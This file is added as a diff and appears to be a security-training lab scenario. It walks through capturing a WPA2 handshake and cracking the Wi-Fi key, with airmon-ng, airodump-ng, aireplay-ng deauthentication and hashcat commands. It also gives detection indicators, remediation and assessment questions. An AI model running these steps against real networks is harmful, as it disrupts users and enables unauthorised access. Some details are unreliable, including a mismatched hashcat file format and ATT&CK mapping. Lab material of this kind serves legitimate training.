@@ -1,0 +1,109 @@
+# Category: Wireless Security
+name: "WPA2 Handshake Capture and PSK Cracking"
+id: "wireless-wpa2-crack-001"
+category: "wireless_security"
+subcategory: "wifi"
+difficulty: "intermediate"
+estimated_time: "90 minutes"
+
+description: |
+  Capture the WPA2 4‑way handshake from a target Wi‑Fi network and crack
+  the pre‑shared key (PSK) using offline dictionary or brute‑force attacks.
+  This scenario covers monitor mode setup, handshake capture with aircrack‑ng,
+  and password cracking with hashcat.
+
+learning_objectives:
+  - Understand WPA2 handshake and PMKID
+  - Set up monitor mode on a wireless adapter
+  - Capture handshake using airodump‑ng and aireplay‑ng
+  - Crack captured hash using hashcat (dictionary/rule‑based)
+
+tools:
+  - aircrack-ng suite
+  - hashcat
+  - kismet
+  - Wireshark
+  - hcxdumptool (for PMKID)
+
+prerequisites:
+  - Compatible Wi‑Fi adapter with monitor mode support
+  - Target WPA2‑PSK network
+  - Wordlist (e.g., rockyou.txt)
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Scan for networks and clients"
+    commands:
+      - "# Set interface to monitor mode"
+      - "airmon-ng start wlan0"
+      - "# Scan networks"
+      - "airodump-ng wlan0mon"
+    expected_output: "BSSID, channel, ESSID, and STAs (clients) of target"
+    detection: "Wireless IDS (WIDS) may detect deauth and association floods"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Capture handshake"
+    commands:
+      - "# Start airodump on target channel and BSSID"
+      - "airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0mon"
+      - "# Deauthenticate a client to force re‑association (if needed)"
+      - "aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon"
+      - "# Wait for handshake (WPA handshake) in airodump"
+    expected_output: "Handshake captured (saved in .cap file)"
+    detection: "Deauthentication floods; multiple reassociation attempts"
+
+  - id: "step3"
+    phase: "cracking"
+    action: "Convert to hashcat format and crack"
+    commands:
+      - "# Convert cap to hccapx (hashcat 6+ uses .22000)"
+      - "cap2hccapx capture.cap capture.hccapx"
+      - "# Or use online conversion"
+      - "# Crack with hashcat"
+      - "hashcat -m 22000 capture.22000 -a 0 rockyou.txt"
+    expected_output: "Pre‑shared key recovered"
+    detection: "N/A (offline)"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1430"
+    description: "Exploit Public‑Facing Wireless"
+  - standard: "NIST SP 800-153"
+    control: "5.2"
+    description: "Wireless Security – Encryption"
+
+detection:
+  network_indicators:
+    - "Abnormal deauth frames"
+    - "Repeated association requests from same MAC"
+  log_indicators:
+    - "WLAN controller logs showing client disconnections"
+  endpoint_indicators:
+    - "aircrack‑ng tools running"
+
+remediation:
+  immediate:
+    - "Use strong passphrases (>12 characters, complex)"
+    - "Enable WPA3 (SAE) to resist offline dictionary attacks"
+  long_term:
+    - "Implement 802.1X authentication (WPA‑Enterprise) instead of PSK"
+    - "Monitor for deauthentication floods using WIDS"
+
+variables:
+  interface: "wlan0"
+  channel: 6
+  bssid: "AA:BB:CC:DD:EE:FF"
+  client_mac: "11:22:33:44:55:66"
+
+assessment_questions:
+  - "Why is the 4‑way handshake necessary for WPA2 authentication?"
+  - "How does PMKID capture differ from traditional handshake capture?"
+  - "What makes WPA3 more resistant to offline cracking?"
+
+references:
+  - url: "https://www.aircrack-ng.org/doku.php"
+    title: "aircrack‑ng documentation"
+  - url: "https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2"
+    title: "hashcat WPA2 cracking guide"
